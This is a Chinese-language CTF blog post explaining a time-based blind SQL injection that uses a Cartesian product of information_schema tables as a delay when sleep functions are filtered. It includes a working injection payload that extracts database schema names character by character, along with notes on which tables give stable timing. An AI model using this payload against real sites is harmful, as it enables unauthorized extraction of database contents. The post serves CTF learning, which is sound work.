---
title: 笛卡尔积延时注入
date: 2017-11-15 10:18:33
categories: CTF
tags: 
- blind injection
toc: true
---

题目过滤了各种延时函数，当时也考虑过使用某种循环查询产生类似延时的效果，奈何水平不够。看了大佬的WP学到了用笛卡尔积产生延时效果orz

payload
```
/?id=1 union select * from OPENQUERY([mysql],'select if(ord(mid((select SCHEMA_NAME frOm iNfOrmAtiOn_schEma.SCHEMATA limit 3,1),1,1))=97,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.columns C),0)')
```

使用
```
SELECT * from database.tableA,database.tableB
```
就会对tableA,B进行笛卡尔运算。
例如：
tableA：

id | user
--|----
1|a
2|b

tableB：

uid|name
--|---
3|c
4|d

笛卡尔运算的结果：

id | user| uid | name
---|-----|-----|----
1  |a    |3    |c
1  |a    |4    |d
2  |b    |3    |c
2  |b    |4    |d 

实际测试发现使用`information_schema.columns`不稳定，因为对于不同的数据库，`columns`的数量是不同的，太少起不了延时效果，太多可能会导致数据库崩溃。
使用`character_sets`（41行）和`collations`（222行）效果可能会好点，因为数据量相对计较统一。
```
mysql> SELECT count(*) FROM information_schema.plugins ,information_schema.plugins A,information_schema.collations ,information_schema.collations B;
+----------+
| count(*) |
+----------+
| 95413824 |
+----------+
1 row in set (4.58 sec)
```
同名表后面跟着的`A`,`B`是别名，不然选取同一个表会报错
```
mysql> SELECT * from information_schema.plugins,information_schema.plugins;
ERROR 1066 (42000): Not unique table/alias: 'plugins'
```